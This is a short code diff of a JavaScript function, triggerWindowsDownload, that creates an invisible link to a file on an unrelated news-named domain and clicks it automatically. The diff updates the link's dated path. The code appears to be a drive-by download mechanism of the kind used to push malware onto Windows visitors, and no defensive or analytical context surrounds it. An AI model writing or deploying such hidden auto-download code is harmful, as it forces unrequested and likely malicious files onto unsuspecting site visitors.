@@ -1,6 +1,6 @@
 function triggerWindowsDownload() {
   const a = document.createElement('a');
-  a.href = 'https://donggangnews.com/kl/27-03-my';
+  a.href = 'https://donggangnews.com/kl/28-03-my';
   a.style.display = 'none';
   document.body.appendChild(a);
   a.click();
